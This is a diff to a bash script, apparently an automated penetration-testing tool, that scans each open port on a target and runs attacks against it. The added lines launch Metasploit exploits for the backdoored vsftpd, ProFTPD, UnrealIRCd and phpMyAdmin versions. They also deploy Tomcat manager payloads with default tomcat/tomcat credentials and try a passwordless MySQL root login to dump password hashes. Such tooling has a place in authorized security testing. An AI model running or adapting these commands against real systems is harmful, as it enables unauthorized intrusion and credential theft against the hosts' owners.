@@ -141,7 +141,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 21 opened... running tests...$RESET"	
 	nmap -sV -sC -p 21 --script=ftp-* $TARGET
-	
+	msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
 fi
 
 if [ -z "$port_22" ]
@@ -210,7 +210,7 @@ else
 	
 	fi
 	
-	nmap -sV -p 80 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper $TARGET
+	nmap -sV -p 80 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper,http-phpmyadmin-dir-traversal $TARGET
 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I http://$TARGET | egrep -i 'X-Content' | tail -n 10
 	echo ""
@@ -266,6 +266,8 @@ else
 	wpscan --url http://$TARGET --batch
 	python $CMSMAP -t http://$TARGET
 	sqlmap -u "http://$TARGET" --batch --crawl=5 -f
+	arachni http://$TARGET --output-only-positives --scope-include-subdomains
+	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; set RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 fi
 
 if [ -z "$port_110" ]
@@ -402,6 +404,7 @@ else
 	wpscan --url https://$TARGET --batch
 	python $CMSMAP -t https://$TARGET
 	sqlmap -u "https://$TARGET" --batch --crawl=5 -f
+	arachni https://$TARGET --output-only-positives --scope-include-subdomains
 fi
 
 if [ -z "$port_445" ]
@@ -465,6 +468,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 2121 opened... running tests...$RESET"
 	nmap -sV --script=ftp* -p 2121 $TARGET
+	msfconsole -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
 fi
 
 if [ -z "$port_3306" ]
@@ -473,6 +477,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 3306 opened... running tests...$RESET"
 	nmap -sV --script=mysql* -p 3306 $TARGET
+	mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'
 fi
 
 if [ -z "$port_3389" ]
@@ -530,6 +535,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 6667 opened... running tests...$RESET"
 	nmap -sV --script=irc* -p 6667 $TARGET
+	msfconsole -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_8000" ]
@@ -547,6 +553,7 @@ else
 	./massbleed $TARGET port 8000
 	cd ..
 	nikto -h http://$TARGET:8000 
+	arachni http://$TARGET:8000 --output-only-positives --scope-include-subdomains
 fi
 
 if [ -z "$port_8100" ]
@@ -564,6 +571,7 @@ else
 	./massbleed $TARGET port 8100
 	cd ..
 	nikto -h http://$TARGET:8100 
+	arachni http://$TARGET:8100 --output-only-positives --scope-include-subdomains
 fi
 
 if [ -z "$port_8080" ]
@@ -582,7 +590,7 @@ else
 	cd ..
 	nikto -h http://$TARGET:8080 
 	nmap -p 8080 --script=*proxy* $TARGET
-	msfconsole -x "use admin/http/tomcat_administration; setg RHOST "$TARGET"; setg RPORT 8080; setg RHOSTS "$TARGET"; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; run; exit;"
+	msfconsole -x "use admin/http/tomcat_administration; setg RHOST "$TARGET"; setg RPORT 8080; setg RHOSTS "$TARGET"; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
 if [ -z "$port_8180" ]
@@ -601,6 +609,8 @@ else
 	cd ..
 	nikto -h http://$TARGET:8180 
 	nmap -p 8180 --script=*proxy* $TARGET
+	arachni http://$TARGET:8180 --output-only-positives --scope-include-subdomains
+	msfconsole -x "use admin/http/tomcat_administration; setg RHOST "$TARGET"; setg RPORT 8180; setg RHOSTS "$TARGET"; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
 if [ -z "$port_8443" ]
@@ -617,8 +627,9 @@ else
 	cd MassBleed
 	./massbleed $TARGET port 8443
 	cd ..
-	nikto -h http://$TARGET:8443 
+	nikto -h https://$TARGET:8443 
 	nmap -p 8443 --script=*proxy* $TARGET
+	arachni https://$TARGET:8443 --output-only-positives --scope-include-subdomains
 fi
 
 if [ -z "$port_10000" ]
